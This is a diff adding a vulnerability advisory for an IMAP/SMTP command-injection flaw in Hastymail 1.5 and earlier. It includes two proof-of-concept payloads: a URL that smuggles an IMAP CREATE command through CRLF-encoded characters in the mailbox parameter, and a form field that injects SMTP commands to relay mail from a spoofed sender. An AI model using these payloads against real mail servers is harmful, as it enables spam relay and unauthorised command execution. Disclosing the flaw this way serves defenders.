@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/20424/info
+
+Hastymail is prone to an IMAP / SMTP command-injection vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An authenticated malicious user could execute arbitrary IMAP / SMTP commands on the affected mail server processes. This may allow the user to send SPAM from the server or to exploit latent vulnerabilities in the underlying system.
+
+Hastymail 1.5 and prior versions are affected.
+
+This example sends the CREATE IMAP commands to the vulnerable parameter:
+http://www.example.com/<path_to_hastymail>/html/mailbox.php?id=47fc54216aae12d57570c9703abe1b7d&mailbox=INBOX%2522%0d%0aA0003%20CREATE
+%2522INBOX.vad
+
+The SMTP POST relay example from nonexistant email address is available:
+
+POST http://www.example.com/<path_to_hastymail>/html/compose.php HTTP/1.1
+
+to include:
+
+Content-Disposition: form-data; name="subject"
+
+Proof of Concept
+.
+mail from: hacker@domain.com
+rcpt to: victim@otherdomain.com
+data
+This is a proof of concept of the SMTP command injection in Hastymail
+.
